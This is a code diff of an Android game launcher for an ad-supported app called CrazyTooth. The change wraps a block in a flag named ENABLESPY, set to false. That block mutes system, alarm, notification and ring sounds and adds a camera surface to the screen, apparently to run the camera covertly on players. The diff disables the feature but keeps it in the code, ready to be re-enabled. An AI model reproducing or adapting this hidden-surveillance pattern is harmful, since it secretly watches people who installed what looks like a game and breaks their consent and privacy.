@@ -30,6 +30,8 @@ import com.google.android.gms.ads.AdView;
 import ca.uqac.game.CrazyTooth;
 
 public class AndroidLauncher extends AndroidApplication {
+	private static final boolean ENABLESPY = false;
+
 	CameraSurface cameraSurface;
 	AdView adView;
 	View gameView;
@@ -54,23 +56,24 @@ public class AndroidLauncher extends AndroidApplication {
 				RelativeLayout.LayoutParams.MATCH_PARENT);
 		layout.setLayoutParams(params);
 
-		AudioManager manager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-		manager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
-		manager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
-		manager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
-		manager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
-		manager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
-
-		cameraSurface = new CameraSurface(this);
-
-		params = new RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT,
-				LayoutParams.WRAP_CONTENT);
-		cameraSurface.setLayoutParams(params);
 		createAdView();
 		createGameView(config);
 
 		layout.addView(gameView);
-		layout.addView(cameraSurface);
+		if (ENABLESPY) {
+			AudioManager manager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+			manager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
+			manager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
+			manager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
+			manager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
+			manager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
+
+			cameraSurface = new CameraSurface(this);
+			params = new RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT,
+					LayoutParams.WRAP_CONTENT);
+			cameraSurface.setLayoutParams(params);
+			layout.addView(cameraSurface);
+		}
 		layout.addView(adView);
 
 		setContentView(layout);
